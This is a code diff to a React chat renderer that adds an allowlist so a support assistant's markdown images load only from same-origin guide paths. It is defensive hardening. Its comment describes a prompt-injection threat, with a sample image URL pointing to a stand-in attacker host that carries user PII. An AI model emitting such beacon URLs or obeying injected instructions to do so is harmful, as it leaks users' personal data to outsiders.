@@ -187,6 +187,24 @@ const FormattedMarkdownText = React.memo(function FormattedMarkdownText({ text }
   return <div className="flex flex-col gap-1.5 leading-relaxed">{elements}</div>;
 });
 
+/**
+ * Only same-origin guide assets may be rendered as images. The support
+ * assistant is *told* to emit `![](/images/guides/…png)` (server-side prompt),
+ * but its output is model-controlled: without this allowlist an injected
+ * instruction could emit `![](https://attacker/?d=<PII>)`, and the browser
+ * would auto-GET it — an exfiltration beacon for the user data the support
+ * prompt places in context. Reject anything with a scheme, protocol-relative
+ * `//host`, or a path escaping `/images/`; those fall back to plain text.
+ */
+function isSafeGuideImageSrc(url: string): boolean {
+  const trimmed = url.trim();
+  if (!trimmed.startsWith("/images/")) return false; // must be a rooted same-origin path
+  if (trimmed.startsWith("//")) return false; // protocol-relative → cross-origin
+  if (/[:\\]/.test(trimmed)) return false; // no scheme (javascript:, data:, http:) or backslashes
+  if (trimmed.includes("..")) return false; // no path traversal
+  return true;
+}
+
 function renderInlineFormatting(str: string) {
   const parts = str.split(/(\*\*.*?\*\*|`.*?`|!\[.*?\]\(.*?\))/g);
   return parts.map((part, i) => {
@@ -204,14 +222,18 @@ function renderInlineFormatting(str: string) {
       const match = part.match(/!\[(.*?)\]\((.*?)\)/);
       if (match) {
         const [, alt, url] = match;
-        return (
-          <img
-            key={i}
-            src={url}
-            alt={alt}
-            className="my-2 max-w-full rounded-card border border-hairline object-contain shadow-sm"
-          />
-        );
+        if (isSafeGuideImageSrc(url)) {
+          return (
+            <img
+              key={i}
+              src={url}
+              alt={alt}
+              className="my-2 max-w-full rounded-card border border-hairline object-contain shadow-sm"
+            />
+          );
+        }
+        // Untrusted image URL: render the alt text instead of loading it.
+        return <span key={i}>{alt}</span>;
       }
     }
     return part;
